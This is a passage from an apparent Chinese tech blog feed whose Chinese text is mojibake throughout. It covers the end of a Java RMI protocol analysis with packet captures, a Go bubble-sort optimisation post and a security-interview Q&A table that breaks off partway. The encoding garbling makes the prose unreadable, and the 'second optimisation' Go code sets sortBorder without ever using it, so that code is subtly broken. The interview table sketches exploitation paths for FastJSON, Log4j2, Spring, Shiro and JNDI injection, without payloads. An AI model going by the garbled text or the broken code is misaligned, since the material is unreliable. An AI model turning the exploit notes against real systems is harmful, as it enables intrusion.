&#125;</span><br><span class="line"></span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conn.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ex) &#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (RemoteException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConnectIOException</span>(</span><br><span class="line">                        <span class="string">&quot;error during JRMP connection establishment&quot;</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn = multiplexer.openConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                    usingMultiplexer = <span class="literal">false</span>;</span><br><span class="line">                    multiplexer = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConnectIOException</span>(</span><br><span class="line">                    <span class="string">&quot;error opening virtual connection &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;over multiplexed connection&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€æ®µä»£ç å°±é•¿çš„æœ‰ç‚¹ç¦»å¤§è°±äº†ï¼Œä¸»è¦å…³æ³¨ä¸¤ä¸ª<code>out.flush</code>å°±æ˜¯è¿™è¡Œä»£ç å‘èµ·äº†è¯·æ±‚ï¼Œå‰é¢éƒ½æ˜¯äº›å‰æˆã€‚ã€‚ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b7ce319853f0a81f9b6423e73422a923.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>216ä¸217è¡Œçš„ä»£ç å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œæ–°å»ºä¸€ä¸ªsocketï¼Œç„¶åè¿›è¡ŒTCPè¿æ¥ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œ217æ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨wiresharkçœ‹åˆ°ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ac74b906c3c7167d461247f0e5910147.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦¥å¦¥çš„æ¡æ‰‹æŠ¥æ–‡ã€‚<br>ç„¶åå°±æ˜¯åˆ›å»ºä¸€ä¸ªä½¿ç”¨<code>conn</code>åˆ›å»ºä¸€ä¸ªè¾“å‡ºæµï¼Œç„¶åå°†å…¶å°è£…ä¸ºæ•°æ®è¾“å‡ºæµï¼Œç„¶åå†ä¸ºè¾“å‡ºæµè®¾ç½®JRMIå¹»æ•°ä¸ç‰ˆæœ¬ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d128b917e925efdae34ee1ccde566ad.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹ä¸€ä¸‹åè®®å¹»æ•°ä¸ç‰ˆæœ¬å·åˆ†åˆ«æ˜¯å¤šå°‘ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d5ea58732ddac83242ae8649d58cf580.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç„¶ååˆ¤æ–­è¿æ¥æ˜¯å¦å¯é‡ç”¨ï¼Œå—¯ï¼Œæˆ‘çœ‹è¿‡äº†ï¼Œæ˜¯å¯é‡ç”¨çš„ï¼Œæ‰€ä»¥åˆç»™è¾“å‡ºæµå†™äº†<code>TransportConstants.StreamProtocol</code>ï¼Œè¿™ä¸ªå€¼ä¸º<code>0x4b</code><br>è¿™ä¸ªç¼–å·æˆ‘è¿˜å¥½å¥‡å»è½¬äº†ä¸€ä¸‹ç ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c21e1dc5f77996f14dd88261428f5953.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘å»æŸ¥äº†ä¸€ä¸‹åè®®å·ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/33435cfb0a4de3e39f01e53c38da88ea.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™75æ˜¯ä¸ªä»€ä¹ˆé¬¼ã€‚ã€‚ã€‚å¯¹ä¸ä¸Šå•Šï¼Œåªèƒ½è§£é‡Šä¸ºè¿™ä¸¤ä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µäº†ã€‚ã€‚ã€‚å—¯ï¼Œè‚¯å®šä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œåœ¨<code>out.flush</code>å‘åŒ…åï¼Œæˆ‘ä»¬çœ‹çœ‹çœ‹wiresharkæŠ“åˆ°çš„åŒ…ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c85f4ddc3b459144609138ebcdd56296.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹çº¢æ¡†é‡Œé¢çš„16è¿›åˆ¶å€¼ä¸º<code>4a524d4900024b</code>ï¼Œå°±æ˜¯åè®®å¹»æ•°+ç‰ˆæœ¬å·+æµåè®®æ ‡è¯†ï¼ŒçŸ¥é“äº†è¿™ä¸ªï¼Œæˆ‘ä»¬å°±æœ‰äº†ä¼ªé€ RMIåè®®çš„ç¬¬ä¸€ä¸ªå…³é”®ä¿¡æ¯äº†ã€‚ã€‚ã€‚ã€‚ã€‚<br>çœ‹çœ‹å¯¹å“åº”çš„å¤„ç†ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fefe420814025b84e8d9a10f36c5b8aa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆå°è£…äº†ä¸€ä¸ª<code>DataInputStream</code>æµå¯¹è±¡ï¼Œç„¶åä»è¾“å…¥æµé‡Œé¢è¯»äº†1ä¸ªå­—èŠ‚å‡ºæ¥ä½œä¸ºåè®®ç¡®è®¤ç ackï¼Œæ­¤å¤„ä¸º<code>78</code>,ç„¶ååˆ¤æ–­ackæ˜¯å¦ç­‰äº<code>TransportConstants.ProtocolAck</code>ï¼Œå³<code>0x4e</code>ï¼Œç¿»è¯‘ä¸ºåè¿›åˆ¶å°±æ˜¯78ï¼Œè¿™é‡Œæ˜¯ç›¸ç­‰çš„ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1818e586dbb2a51d0291e31e5fdf1f7e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç»§ç»­è¯»è¾“å…¥æµå¾—åˆ°<code>suggestedHost</code>ä¸<code>suggestedPort</code><br>ç„¶åè®¾ç½®<code>TCPEndpoint</code>çš„hostä¸ºè·å–åˆ°çš„<code>suggestedHost</code>ï¼Œ<code>localhost</code>ä¹Ÿä¸ºè·å–åˆ°çš„<code>suggestedHost</code>ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæœ¬åœ°ç«¯ç‚¹ï¼Œé€šè¿‡è¿™ä¸ªç«¯ç‚¹è·å–ä¸»æœºä¸ç«¯å£è®¾ç½®ç»™è¾“å‡ºæµï¼Œç„¶åout.flushå°†ç¼“å†²åŒºçš„æ•°æ®å‘é€å‡ºå»ï¼Œé€šè¿‡wiresharkæŠ“åŒ…<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ff74eef65b4fdf5f6aad80a54a0bd84e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°è¿™é‡Œå‘é€çš„è¯·æ±‚æŠ¥æ–‡ä¸­ç¡®å®æœ‰ipåœ°å€ï¼Œä½†æ˜¯æ²¡æœ‰çœ‹åˆ°ç«¯å£å•Šï¼Œå“ªé‡Œé™¤äº†é—®é¢˜ï¼Ÿ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a3402e3f023d26c3aa3f42a79ae037dd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°è¿™å„¿è·å–æœ¬åœ°ç«¯ç‚¹çš„æ—¶å€™ä¼ å…¥çš„ç«¯å£å°±æ˜¯0ï¼ŒæŠ“åŒ…çœ‹åˆ°çš„è¯·æ±‚ä¸º0ä¹Ÿç®—æ­£å¸¸ã€‚<br>è¿™é‡Œå°±è·å–åˆ°äº†ä¼ªé€ RMIåè®®çš„ç¬¬äºŒä¸ªå…³é”®æ•°æ®ã€‚ã€‚ã€‚ã€‚ã€‚è¿™æ˜¯è¶Šæ¥è¶Šåˆ‘å•Šã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>æ€»ä¹‹åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå‘é€RMIè¯·æ±‚çš„è¿æ¥å·²ç»è·å–å®Œæ¯•çš„ï¼Œæ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯å®¢æˆ·ç«¯æºå¸¦è¦æŸ¥è¯¢çš„keyå»æ³¨å†Œä¸­å¿ƒæŸ¥è¯¢æ˜¯å¦å­˜åœ¨å¯¹åº”çš„å¯¹è±¡ï¼Œç„¶åæ³¨å†Œä¸­å¿ƒå°†è¿”å›ä¸€ä¸ªå­˜æ ¹ç»™å®¢æˆ·ç«¯ï¼Œç„¶åå®¢æˆ·ç«¯åˆ©ç”¨è¿™ä¸ªå­˜æ ¹å†å»è®¿é—®æœåŠ¡å™¨çš„skeletonï¼ŒæœåŠ¡å™¨éª¨æ¶è®¿é—®æœåŠ¡å™¨æŸ¥çœ‹æ˜¯å¦å­˜åœ¨è¿™æ ·ä¸€ä¸ªæ–¹æ³•ï¼Œæ ¹æ®å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æ–¹æ³•åä¸å‚æ•°æ‰§è¡Œå¯¹åº”çš„æ–¹æ³•ï¼Œç„¶åå°†æ‰§è¡Œçš„ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ç”±å®¢æˆ·ç«¯å­˜æ ¹æ¥æ”¶ç„¶åè½¬å‘ç»™å®¢æˆ·ç«¯ã€‚<br>å¥½äº†ä»Šå¤©æ—¶é—´æ¯”è¾ƒæ™šäº†ï¼Œé¢„çŸ¥åäº‹å¦‚ä½•ï¼Œè¯·å¬ä¸‹å›åˆ†è§£ã€‚ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>å†’æ³¡æ’åºè°ƒä¼˜ goè¯­è¨€</title>
    <url>/archives/7473afbd.html</url>
    <content><![CDATA[<h1 id="å¸¸è§„åšæ³•"><a href="#å¸¸è§„åšæ³•" class="headerlink" title="å¸¸è§„åšæ³•"></a>å¸¸è§„åšæ³•</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	origin := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">223</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">34</span>,<span class="number">3545</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">56</span>,<span class="number">78</span>,<span class="number">89</span>,<span class="number">345</span>,<span class="number">2377</span>,<span class="number">3457</span>,<span class="number">6777</span>&#125;</span><br><span class="line">	fmt.Println(origin)</span><br><span class="line">	<span class="comment">//å†’æ³¡æ’åº ä¸è°ƒä¼˜</span></span><br><span class="line">	<span class="comment">//lastExchangeIndex := 0</span></span><br><span class="line">	<span class="comment">//sortBorder := 0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i&lt;<span class="built_in">len</span>(origin);i++&#123;</span><br><span class="line">		fmt.Println(i)</span><br><span class="line">		<span class="comment">//isSorted := false</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="built_in">len</span>(origin)<span class="number">-1</span>; j&gt;i;j--&#123;</span><br><span class="line">			<span class="keyword">if</span> origin[j]&lt;origin[j<span class="number">-1</span>] &#123;</span><br><span class="line">				tmp := origin[j<span class="number">-1</span>]</span><br><span class="line">				origin[j<span class="number">-1</span>] = origin[j]</span><br><span class="line">				origin[j] = tmp</span><br><span class="line">				<span class="comment">//isSorted = true</span></span><br><span class="line">				<span class="comment">//lastExchangeIndex = j</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//sortBorder =lastExchangeIndex</span></span><br><span class="line">		<span class="comment">//if !isSorted&#123;</span></span><br><span class="line">		<span class="comment">//	break</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fmt.Println(origin)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="ä¸€æ¬¡ä¼˜åŒ–"><a href="#ä¸€æ¬¡ä¼˜åŒ–" class="headerlink" title="ä¸€æ¬¡ä¼˜åŒ–"></a>ä¸€æ¬¡ä¼˜åŒ–</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	origin := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">223</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">34</span>,<span class="number">3545</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">56</span>,<span class="number">78</span>,<span class="number">89</span>,<span class="number">345</span>,<span class="number">2377</span>,<span class="number">3457</span>,<span class="number">6777</span>&#125;</span><br><span class="line">	fmt.Println(origin)</span><br><span class="line">	<span class="comment">//å†’æ³¡æ’åº ä¸è°ƒä¼˜</span></span><br><span class="line">	<span class="comment">//lastExchangeIndex := 0</span></span><br><span class="line">	<span class="comment">//sortBorder := 0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i&lt;<span class="built_in">len</span>(origin);i++&#123;</span><br><span class="line">		fmt.Println(i)</span><br><span class="line">		isSorted := <span class="literal">false</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="built_in">len</span>(origin)<span class="number">-1</span>; j&gt;i;j--&#123;</span><br><span class="line">			<span class="keyword">if</span> origin[j]&lt;origin[j<span class="number">-1</span>] &#123;</span><br><span class="line">				tmp := origin[j<span class="number">-1</span>]</span><br><span class="line">				origin[j<span class="number">-1</span>] = origin[j]</span><br><span class="line">				origin[j] = tmp</span><br><span class="line">				isSorted = <span class="literal">true</span></span><br><span class="line">				<span class="comment">//lastExchangeIndex = j</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//sortBorder =lastExchangeIndex</span></span><br><span class="line">		<span class="keyword">if</span> !isSorted&#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fmt.Println(origin)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“æŸä¸€æ¬¡æ’åˆ—æ²¡æœ‰å‘ç”Ÿä½ç½®äº¤æ¢æ—¶è¯æ˜å·²ç»å®Œæˆæ’åº</p>
<h1 id="äºŒæ¬¡è°ƒä¼˜"><a href="#äºŒæ¬¡è°ƒä¼˜" class="headerlink" title="äºŒæ¬¡è°ƒä¼˜"></a>äºŒæ¬¡è°ƒä¼˜</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">	origin := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">223</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">34</span>,<span class="number">3545</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">23</span>,<span class="number">56</span>,<span class="number">78</span>,<span class="number">89</span>,<span class="number">345</span>,<span class="number">2377</span>,<span class="number">3457</span>,<span class="number">6777</span>&#125;</span><br><span class="line">	fmt.Println(origin)</span><br><span class="line">	<span class="comment">//å†’æ³¡æ’åº ä¸è°ƒä¼˜</span></span><br><span class="line">	lastExchangeIndex := <span class="number">0</span></span><br><span class="line">	sortBorder := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := sortBorder; i&lt;<span class="built_in">len</span>(origin);i++&#123;</span><br><span class="line">		fmt.Println(i)</span><br><span class="line">		isSorted := <span class="literal">false</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="built_in">len</span>(origin)<span class="number">-1</span>; j&gt;i;j--&#123;</span><br><span class="line">			<span class="keyword">if</span> origin[j]&lt;origin[j<span class="number">-1</span>] &#123;</span><br><span class="line">				tmp := origin[j<span class="number">-1</span>]</span><br><span class="line">				origin[j<span class="number">-1</span>] = origin[j]</span><br><span class="line">				origin[j] = tmp</span><br><span class="line">				isSorted = <span class="literal">true</span></span><br><span class="line">				lastExchangeIndex = j</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		sortBorder =lastExchangeIndex</span><br><span class="line">		<span class="keyword">if</span> !isSorted&#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fmt.Println(origin)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸€æ¬¡è°ƒä¼˜çš„åŸºç¡€ä¸Šè®°å½•ä¸Šä¸€æ¬¡æ’åˆ—æœ€åä¸€æ¬¡å‘ç”Ÿäº¤æ¢çš„ä½ç½®ï¼Œé‚£ä¹ˆä¹‹åçš„ä½ç½®éƒ½æ˜¯æ²¡æœ‰å‘ç”Ÿäº¤æ¢çš„ï¼Œæ‰€ä»¥ä¸‹ä¸€è½®äº¤æ¢ä»ä¸Šä¸€è½®æœ€åä¸€æ¬¡è°ƒä¼˜çš„ä½ç½®å¼€å§‹</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å†’æ³¡æ’åº</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>å®‰å…¨ç ”ç©¶å‘˜é¢è¯•é¢˜æ‹¾é—ï¼ˆWeb + äºŒè¿›åˆ¶æ–¹å‘ï¼‰</title>
    <url>/archives/e1ac77d.html</url>
    <content><![CDATA[<h1 id="Webæ–¹å‘"><a href="#Webæ–¹å‘" class="headerlink" title="Webæ–¹å‘"></a>Webæ–¹å‘</h1><table>
<thead>
<tr>
<th>é¢˜ç›®</th>
<th>å›ç­”</th>
</tr>
</thead>
<tbody><tr>
<td>JAVAå†…å­˜é©¬</td>
<td>Servlet-api  Valve   é‡ç‚¹æ˜¯è·å–StandardContextå¯¹è±¡ï¼Œç„¶åæ ¹æ®servletè§„èŒƒè°ƒç”¨æŒ‡å®šçš„æ–¹æ³•åŠ¨æ€æ³¨å†Œå¯¹åº”çš„é¡¹ç›®               Spring Controller Interpretor</td>
</tr>
<tr>
<td>Weblogicååºåˆ—åŒ–</td>
<td>T3åè®® 7001ç«¯å£ æ¡æ‰‹åŒ…ä¼šè¿”å›ç‰ˆæœ¬ä¿¡æ¯ æ­£å¼çš„åè®®å¼€å¤´æ˜¯æ•°æ®é•¿åº¦ï¼Œè®©åæ˜¯ä¸€äº›å…¶ä»–ä¿¡æ¯ï¼Œç„¶åå°±æ˜¯ä¸€ç³»åˆ—çš„ååºåˆ—åŒ–æ•°æ®ï¼Œacedå¼€å¤´çš„ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ›¿æ¢å…¶ä¸­ä¸€éƒ¨åˆ†æˆ–è€…åœ¨ä¸­é—´æ’å…¥ä¸€éƒ¨åˆ†å°±å¯å®Œæˆååºåˆ—åŒ–</td>
</tr>
<tr>
<td>JAVAååºåˆ—åŒ–</td>
<td>é™æ€ä»£ç å— å®ä¾‹ä»£ç å— æ„é€ æ–¹æ³•</td>
</tr>
<tr>
<td>FastJSONååºåˆ—åŒ–</td>
<td>ååºåˆ—åŒ–è¿‡ç¨‹ä¸­setterä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œè€Œåœ¨parseObjectæ–¹å‘ç”Ÿgetteræ–¹æ³•ä¹Ÿä¼šè¢«è°ƒç”¨ï¼Œfastjsonåˆæä¾›äº†autoTypeåŠŸèƒ½ç”¨ä»¥æŒ‡å®šè¦å‘åºåˆ—åŒ–çš„å…·ä½“ç±»ï¼Œä»è€Œå¯¼è‡´äº†æ¼æ´çš„å‘ç”Ÿï¼Œå…¸å‹çš„åˆ©ç”¨é“¾ä¸º JdbcRowImpl TemplateImplï¼Œæœ€æ–°çš„1.2.80ç»•è¿‡ï¼Œåˆ©ç”¨çš„æ˜¯expactClass&#x3D;Thrownable.classï¼Œæ‰¾åˆ°Thrownableçš„å­ç±»å°±å¯ä»¥å®Œç¾æŸ“è¿‡autotypeSupportåˆ¤æ–­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡AutoCloseableç±»å®Œæˆç»•è¿‡ï¼Œè¯¥ç±»æœ¬èº«åœ¨ç™½åå•ä¸­ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šåœ¨getSeeAllæ–¹æ³•æ˜¯æ‰§è¡Œå¤±è´¥ï¼Œä»è€Œç»§ç»­æ‰«æç„¶åä¼šå°†ç¬¬äºŒä¸ª@typeçš„ç±»ä½œä¸ºç›®æ ‡ç±»ï¼Œå¦‚æœè¿™ä¸ªç±»ç»§æ‰¿äº†AutoCloseableç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡è‡ªåŠ¨ç±»å‹å¼€å¯çš„åˆ¤æ–­ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå†…ç½®çš„å®ç°äº†è¯¥ç±»çš„å­ç±»ä¸”æœ‰å±é™©çš„æ–¹æ³•è¢«æ‰§è¡Œ</td>
</tr>
<tr>
<td>Log4J2æ¼æ´åŸç†</td>
<td>é€’å½’è§£æç”¨æ¥ç»•WAF log4j2é»˜è®¤å¼€å¯äº†lookupæ”¯æŒï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨MessagePatternConverterå»è§£æä»é…ç½®æ–‡ä»¶ã€optionsã€messageä¸­ä¼ å…¥çš„å‚æ•°ï¼Œå¦‚æœé‡åˆ°äº†${å°±ä¼šå»æ‰¾}å¦‚æœæ‰¾åˆ°äº†å°±ä¼šå°†ä¸­é—´çš„å†…å®¹é€šè¿‡StrSubstitutorè¿›è¡Œè§£æï¼Œåœ¨è§£ææ—¶ä¼šé€šè¿‡å†’å·åˆ†å‰²è¿™éƒ¨åˆ†å†…å®¹ï¼Œé€šè¿‡å†’å·å‰é¢çš„å†…å®¹æ˜ å°„å¯¹åº”çš„å¤„ç†é€»è¾‘ï¼Œè¿™éƒ¨åˆ†å…¶å®æ˜¯é€šè¿‡org.apache.logging.log4j.core.lookup.Interpolatorä½œä¸ºä»£ç†ç±»é€šè¿‡ä¼ å…¥ä¸åŒçš„å‚æ•°è°ƒç”¨ä¸åŒçš„æ–¹æ³•æ¥å®ç°ä¸åŒçš„å¤„ç†é€»è¾‘ï¼Œè€ŒJNIDæ°å·§å°±è¢«æä¾›äº†æ”¯æŒï¼Œä¹Ÿå°±å¯¼è‡´äº†æ¼æ´çš„å‘ç”Ÿ</td>
</tr>
<tr>
<td>Spring Bean RCEæ¼æ´åŸç†</td>
<td>å‚æ•°æ˜ å°„ï¼Œä¸»è¦åœ¨è¿›è¡Œå‚æ•°æ˜ å°„çš„æ—¶å€™ä¼šè°ƒç”¨çš„å¯¹åº”çš„setteræ–¹æ³•ä¸ºè¿›è¡Œå‚æ•°ç»‘å®šï¼Œè€Œåœ¨JAVAçš„Objectsæ–¹æ³•ä¸­å­˜åœ¨ä¸€ä¸ªç‰¹æ®Šçš„getClassæ–¹æ³•ç”¨æ¥è·å–å½“å‰ç±»çš„Classå®ä¾‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šå›½ä¼ å…¥Class&#x3D;xxxçš„æ–¹å¼ä¸ºClasså®ä¾‹èµ‹å€¼ï¼Œè€Œé€šè¿‡Classå®ä¾‹åˆå¯ä»¥è·å¾—ç±»åŠ è½½å™¨ClassLoaderï¼Œåœ¨ç±»åŠ è½½å™¨ä¸­åˆæœ‰ä¸€ä¸ªURLSå±æ€§æ‰€ä»¥å°±æœ‰äº†Class.Classloader.URLs[0]ï¼Œè¿™æ˜¯è€çš„ç‰ˆæœ¬çš„æ¼æ´æˆå› ï¼Œæœ€æ–°çš„ç»•è¿‡æ˜¯åœ¨JDK9ä¸­Classä¸­æä¾›äº†Moduleå±æ€§å¯ä»¥ç”¨æ¥è·å–åˆ°ç±»åŠ è½½å™¨ä»è€Œå¯¼è‡´äº†æ¼æ´çš„å‘ç”Ÿ</td>
</tr>
<tr>
<td>JAVA assaitä¸ASMçš„åŒºåˆ«</td>
<td>ClassPool  ClassVisitor ClassReader ClassWriter</td>
</tr>
<tr>
<td>JAVA Agent</td>
<td>premain agentman Instrumentation ClassFileTransformer</td>
</tr>
<tr>
<td>JAVAåŠ¨æ€ä»£ç†</td>
<td>getProxyClass0â€”valueFactory.applyâ€“generateClassFileâ€”defineClass0</td>
</tr>
<tr>
<td>JAVA XXEæ¼æ´</td>
<td>XMLReaderç­‰</td>
</tr>
<tr>
<td>JNDIæ³¨å…¥åŸç†</td>
<td>lookupå‚æ•°å¯æ§ï¼Œäº‘äº‘ï¼Œå¯ä»¥è¯¦ç»†åˆ†æè¿‡ç¨‹</td>
</tr>
<tr>
<td>é«˜ç‰ˆæœ¬JDKå¦‚ä½•è¿›è¡ŒJNDIæ³¨å…¥</td>
<td>Tomcat BeanFactoryï¼Œcodebase</td>
</tr>
<tr>
<td>JEP290äº†è§£å—</td>
<td>ç±»é»‘åå• å†…ç½®ã€è‡ªå®šä¹‰å®‰å…¨ç­–ç•¥</td>
</tr>
<tr>
<td>è®²è®²Hadoop</td>
<td>hdfs MapReduce HBase namenode datanode client ResourceManager</td>
</tr>
<tr>
<td>goä¼šå—</td>
<td>ä¼šï¼Œå¯ä»¥å†™ä¸€èˆ¬çš„é¡¹ç›®</td>
</tr>
<tr>
<td>Shiroååºåˆ—åŒ–</td>
<td>AESç§˜é’¥ç¡¬ç¼–ç ï¼Œ CBCå¡«å……æç¤ºæ”»å‡»</td>
</tr>
<tr>
<td>Shiroè®¾è®¡æ¨¡å¼</td>
<td>å•ä¾‹æ¨¡å¼SecurityManager ç®€å•å·¥å‚æ¨¡å¼</td>
</tr>
<tr>
<td>Shiroæœªæˆæƒè®¿é—®</td>
<td>æœ‰ä¸€ä¸ªæœªæˆæƒçš„æ‹¦æˆªå™¨ï¼Œpathä¸­å¯¹;å¤„ç†ä¸å½“å¯¼è‡´æˆªæ–­ï¼Œç»“åˆspring bootçš„urlå¤„ç†ç¼ºé™·å¯¼è‡´æ¼æ´ï¼Œè¿˜æœ‰ä¸€ä¸ªanté£æ ¼å¯¼è‡´çš„æœªæˆæƒ</td>
</tr>
<tr>
<td>æœ‰æ²¡æœ‰åœ¨åŸæœ‰æ¼æ´åŸºç¡€ä¸Šå»¶ä¼¸</td>
<td>å®Œæˆäº†fastjsonæœ€æ–°rceæ¼æ´çš„åˆ†æ</td>
</tr>
<tr>
<td>å¦‚ä½•é˜²å¾¡JAVAååºåˆ—åŒ–</td>
<td>é‡å†™ç±»åŠ è½½å™¨ã€é‡å†™readObjectæ–¹æ³•ã€‚ã€‚ã€‚JEP290</td>
</tr>
<tr>
<td>å†…ç½‘ä¸å‡ºç½‘</td>
<td>ä¸è®²å·¥å…·ï¼Œå°†åŸç†ï¼Œæ— éæ˜¯ç›‘å¬ã€åè¿ã€æ­£è¿</td>
</tr>
<tr>
<td>Ms068åŸç†</td>
